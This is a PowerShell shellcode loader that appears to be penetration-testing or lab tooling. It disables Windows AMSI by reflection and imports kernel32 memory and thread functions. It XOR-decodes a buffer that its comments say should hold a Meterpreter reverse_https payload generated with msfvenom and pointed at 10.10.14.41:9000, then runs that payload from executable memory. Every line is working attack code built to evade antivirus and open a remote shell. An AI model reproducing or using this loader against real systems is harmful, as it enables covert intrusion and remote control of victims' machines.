$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
$g=$f.SetValue($null,$true)

$XoztEczuPhqxC = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
"@

$ByDSzcaUjqGtVco = Add-Type -memberDefinition $XoztEczuPhqxC -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $buf =  # meterpreter payload here: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.41 LPORT=9000 -f powershell
                 # xor encode with: for($i=0; $i -lt $buf.count ; $i++) { $buf[$i] = $buf[$i] -bxor 0x6A }

for($i=0; $i -lt $buf.count ; $i++) { $buf[$i] = $buf[$i] -bxor 0x6A }

$lpMem = $ByDSzcaUjqGtVco::VirtualAlloc(0,0x1000,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$lpMem,$buf.Length)
$hThread = $ByDSzcaUjqGtVco::CreateThread(0,0,$lpMem,0,0,0)
$ByDSzcaUjqGtVco::WaitForSingleObject($hThread, [uint32]"0xFFFFFFFF")
